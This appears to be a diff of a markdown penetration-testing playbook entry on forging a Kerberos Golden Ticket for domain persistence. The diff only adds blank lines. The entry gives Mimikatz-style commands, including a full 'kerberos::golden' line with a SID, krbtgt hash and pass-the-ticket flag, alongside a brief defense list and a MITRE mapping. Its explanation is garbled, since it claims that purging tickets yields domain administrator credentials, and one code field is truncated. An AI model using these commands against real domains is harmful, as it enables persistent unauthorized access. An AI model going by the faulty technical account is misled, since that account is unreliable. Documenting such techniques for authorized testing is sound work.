@@ -36,6 +36,8 @@ This procedure involves using Kerberos Purge to obtain domain administrator cred
 
 This procedure involves using Kerberos Purge to obtain domain administrator credentials, which can then be used to create a Golden Ticket. A Golden Ticket is a forged Kerberos ticket that grants the attacker unlimited access to the domain. Kerberos Purge works by deleting all tickets for a specific user, forcing the user to request new tickets. If the attacker can intercept these requests, they can obtain the user's TGT, which can be used to create a Golden Ticket. This technique can be used to maintain persistence in the domain, as well as to move laterally and access sensitive information.
 
+ 
+
 ## Requirements
 
 1. Valid domain credentials
@@ -43,6 +45,8 @@ This procedure involves using Kerberos Purge to obtain domain administrator cred
 1. Access to a domain controller
 
 1. Kerberos Purge tool
+
+ 
 
 ## Defense
 
@@ -52,6 +56,8 @@ This procedure involves using Kerberos Purge to obtain domain administrator cred
 
 1. Implement network segmentation to prevent lateral movement within the domain
 
+ 
+
 ## Objectives
 
 1. Obtain domain administrator credentials
@@ -59,6 +65,8 @@ This procedure involves using Kerberos Purge to obtain domain administrator cred
 1. Create a Golden Ticket for persistent access to the domain
 
 1. Move laterally and access sensitive information
+
+ 
 
 # Instructions
 
@@ -73,10 +81,18 @@ This procedure involves using Kerberos Purge to obtain domain administrator cred
 
 Note: This command should only be used for authorized penetration testing purposes.
 
+ 
+
+
+
 **Code**: [[kerberos::purge
 kerberos::golden /user:evil /domai]]
 
+
+
 > The 'kerberos::purge' command is used to delete all Kerberos tickets from the current user's session. This can be useful in situations where a user has obtained a Kerberos ticket for a specific service and wants to remove it from their session. The 'kerberos::golden' command is used to create a Golden Ticket, which is a forged Kerberos ticket that grants the attacker full access to the domain. This can be used to bypass authentication and gain access to sensitive resources in the domain. It is important to note that the 'kerberos::golden' command should only be used for authorized penetration testing purposes.
+
+
 
 **Command** ([[Purge Kerberos tickets]]):
 
@@ -84,17 +100,27 @@ kerberos::golden /user:evil /domai]]
 kerberos::purge
 ```
 
+
+
+
+
 **Command** ([[Generate Golden Kerberos Ticket]]):
 
 ```bash
 kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
 ```
 
+
+
+
+
 **Command** ([[Request TGT with Golden Ticket]]):
 
 ```bash
 kerberos::tgt
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -123,3 +149,5 @@ kerberos::tgt
 - [[Domain]]
 - [[Golden Ticket]]
 - [[Windows - Persistence]]
+
+
